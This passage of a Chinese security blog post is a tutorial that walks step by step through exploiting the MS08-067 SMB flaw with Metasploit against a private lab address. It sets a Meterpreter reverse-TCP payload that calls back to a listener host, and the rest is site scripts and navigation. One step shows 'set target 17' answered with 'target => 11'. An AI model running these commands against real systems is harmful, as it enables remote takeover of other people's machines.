+  windows/vncinject/reverse_tcp_dns                                    normal  VNC Server (Reflective Injection), Reverse TCP Stager (DNS)
+  windows/vncinject/reverse_tcp_rc4                                    normal  VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption)
+  windows/vncinject/reverse_tcp_uuid                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support
+  windows/vncinject/reverse_winhttp                                    normal  VNC Server (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
+</code></pre></li>
+<li><p>8.设置载荷</p>
+<pre><code>msf exploit(ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcp
+
+payload =&gt; windows/meterpreter/reverse_tcp
+</code></pre><h3 id="这个载荷要么背下要么记得是什么，能找到也行"><a href="#这个载荷要么背下要么记得是什么，能找到也行" class="headerlink" title="这个载荷要么背下要么记得是什么，能找到也行"></a>这个载荷要么背下要么记得是什么，能找到也行</h3></li>
+<li><p>9.设置本地IP地址</p>
+<pre><code>msf exploit(ms08_067_netapi) &gt; set LHOST 192.168.43.236
+
+LHOST =&gt; 192.168.43.236
+</code></pre><h3 id="查看配置信息"><a href="#查看配置信息" class="headerlink" title="查看配置信息"></a>查看配置信息</h3><pre><code>msf exploit(ms08_067_netapi) &gt; show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    192.168.43.176   yes       The target address
+   RPORT    445              yes       Set the SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+</code></pre></li>
+</ul>
+<pre><code>Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &apos;&apos;, seh, thread,   process, none)
+   LHOST     192.168.43.236   yes       The listen address
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+</code></pre><ul>
+<li><p>10.查看和设置目标版本ID</p>
+<pre><code>msf exploit(ms08_067_netapi) &gt; show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+   1   Windows 2000 Universal
+   2   Windows XP SP0/SP1 Universal
+   3   Windows 2003 SP0 Universal
+   4   Windows XP SP2 English (AlwaysOn NX)
+   5   Windows XP SP2 English (NX)
+   6   Windows XP SP3 English (AlwaysOn NX)
+   7   Windows XP SP3 English (NX)
+   8   Windows XP SP2 Arabic (NX)
+   9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)
+   10  Windows XP SP2 Chinese - Simplified (NX)
+   11  Windows XP SP2 Chinese - Traditional (NX)
+   12  Windows XP SP2 Czech (NX)
+   13  Windows XP SP2 Danish (NX)
+   14  Windows XP SP2 German (NX)
+   15  Windows XP SP2 Greek (NX)
+   16  Windows XP SP2 Spanish (NX)
+   17  Windows XP SP2 Finnish (NX)
+   18  Windows XP SP2 French (NX)
+   19  Windows XP SP2 Hebrew (NX)
+   20  Windows XP SP2 Hungarian (NX)
+   21  Windows XP SP2 Italian (NX)
+   22  Windows XP SP2 Japanese (NX)
+   23  Windows XP SP2 Korean (NX)
+   24  Windows XP SP2 Dutch (NX)
+   25  Windows XP SP2 Norwegian (NX)
+   26  Windows XP SP2 Polish (NX)
+   27  Windows XP SP2 Portuguese - Brazilian (NX)
+   28  Windows XP SP2 Portuguese (NX)
+   29  Windows XP SP2 Russian (NX)
+   30  Windows XP SP2 Swedish (NX)
+   31  Windows XP SP2 Turkish (NX)
+   32  Windows XP SP3 Arabic (NX)
+   33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)
+   34  Windows XP SP3 Chinese - Simplified (NX)
+   35  Windows XP SP3 Chinese - Traditional (NX)
+   36  Windows XP SP3 Czech (NX)
+   37  Windows XP SP3 Danish (NX)
+   38  Windows XP SP3 German (NX)
+   39  Windows XP SP3 Greek (NX)
+   40  Windows XP SP3 Spanish (NX)
+   41  Windows XP SP3 Finnish (NX)
+   42  Windows XP SP3 French (NX)
+   43  Windows XP SP3 Hebrew (NX)
+   44  Windows XP SP3 Hungarian (NX)
+   45  Windows XP SP3 Italian (NX)
+   46  Windows XP SP3 Japanese (NX)
+   47  Windows XP SP3 Korean (NX)
+   48  Windows XP SP3 Dutch (NX)
+   49  Windows XP SP3 Norwegian (NX)
+   50  Windows XP SP3 Polish (NX)
+   51  Windows XP SP3 Portuguese - Brazilian (NX)
+   52  Windows XP SP3 Portuguese (NX)
+   53  Windows XP SP3 Russian (NX)
+   54  Windows XP SP3 Swedish (NX)
+   55  Windows XP SP3 Turkish (NX)
+   56  Windows 2003 SP1 English (NO NX)
+   57  Windows 2003 SP1 English (NX)
+   58  Windows 2003 SP1 Japanese (NO NX)
+   59  Windows 2003 SP1 Spanish (NO NX)
+   60  Windows 2003 SP1 Spanish (NX)
+   61  Windows 2003 SP1 French (NO NX)
+   62  Windows 2003 SP1 French (NX)
+   63  Windows 2003 SP2 English (NO NX)
+   64  Windows 2003 SP2 English (NX)
+   65  Windows 2003 SP2 German (NO NX)
+   66  Windows 2003 SP2 German (NX)
+   67  Windows 2003 SP2 Portuguese - Brazilian (NX)
+   68  Windows 2003 SP2 Spanish (NO NX)
+   69  Windows 2003 SP2 Spanish (NX)
+   70  Windows 2003 SP2 Japanese (NO NX)
+   71  Windows 2003 SP2 French (NO NX)
+   72  Windows 2003 SP2 French (NX)
+</code></pre></li>
+</ul>
+<hr>
+<h3 id="设置target-ID"><a href="#设置target-ID" class="headerlink" title="设置target ID"></a>设置target ID</h3><pre><code>msf exploit(ms08_067_netapi) &gt; set target 17
+
+target =&gt; 11
+</code></pre><ul>
+<li><p>11.再一次确认配置信息是否设置完成</p>
+<pre><code>msf exploit(ms08_067_netapi) &gt; show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    192.168.43.176   yes       The target address
+   RPORT    445              yes       Set the SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+</code></pre></li>
+</ul>
+<pre><code>Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &apos;&apos;, seh, thread,   process, none)
+   LHOST     192.168.43.236   yes       The listen address
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   11  Windows XP SP2 Chinese - Traditional (NX)
+</code></pre><ul>
+<li><p>12.开始进攻</p>
+<pre><code>msf exploit(ms08_067_netapi) &gt; exploit
+</code></pre></li>
+</ul>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Metasploit/" rel="tag"># Metasploit</a>
+          
+            <a href="/tags/MS08-067/" rel="tag"># MS08-067</a>
+          
+            <a href="/tags/meterpreter/" rel="tag"># meterpreter</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/14/Metasploit远程控制木马/" rel="next" title="Metasploit远程控制木马">
+                <i class="fa fa-chevron-left"></i> Metasploit远程控制木马
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/01/14/Metasploit魔鬼训练营笔记/" rel="prev" title="Metasploit魔鬼训练营笔记">
+                Metasploit魔鬼训练营笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Healer">
+            
+              <p class="site-author-name" itemprop="name">Healer</p>
+              <p class="site-description motion-element" itemprop="description">桃李不言，下自成蹊</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">28</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">52</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#关于08-067漏洞的利用"><span class="nav-number">1.</span> <span class="nav-text">关于08_067漏洞的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#再次查看配置信息"><span class="nav-number">1.0.1.</span> <span class="nav-text">再次查看配置信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#这个载荷要么背下要么记得是什么，能找到也行"><span class="nav-number">1.0.2.</span> <span class="nav-text">这个载荷要么背下要么记得是什么，能找到也行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看配置信息"><span class="nav-number">1.0.3.</span> <span class="nav-text">查看配置信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置target-ID"><span class="nav-number">1.0.4.</span> <span class="nav-text">设置target ID</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+      
+	<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+	<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+	<div class="widget-wrap">
+	    <h3 class="widget-title">Tag Cloud</h3>
+	    <div id="myCanvasContainer" class="widget tagcloud">
+		<canvas width="250" height="250" id="resCanvas" style="width=100%">
+		    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARP欺骗/">ARP欺骗</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASLR/">ASLR</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASP/">ASP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CMD/">CMD</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEP/">DEP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ettercap/">Ettercap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GDB/">GDB</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IDA/">IDA</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KALI/">KALI</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MARKDOWN/">MARKDOWN</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MS08-067/">MS08-067</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MS12-004/">MS12_004</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Meatsploit/">Meatsploit</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit/">Metasploit</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nmap/">Nmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNTOOLS/">PWNTOOLS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Requests/">Requests</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/">Reverse</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Revese/">Revese</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLMAP/">SQLMAP</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VMware-Tools/">VMware Tools</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/W3AF/">W3AF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/">WEB</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Writeup/">Writeup</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/arpspoof/">arpspoof</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/canary/">canary</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/driftnet/">driftnet</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gef/">gef</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meterpreter/">meterpreter</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/objdump/">objdump</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/peda/">peda</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwndbg/">pwndbg</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/re/">re</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/">shellcode</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/反爬虫/">反爬虫</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/图片/">图片</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆/">堆</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据库注入/">数据库注入</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/断网攻击/">断网攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/更新源/">更新源</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/木马/">木马</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/栈/">栈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/正则表达式/">正则表达式</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫/">爬虫</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/磁盘分区合并/">磁盘分区合并</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/逆向/">逆向</a><span class="tag-list-count">1</span></li></ul>
+		</canvas>
+	    </div>
+	</div>
+	
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Healer</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_pv"></span>
+</span><span class="post-meta-divider">|</span>
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v6.7.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
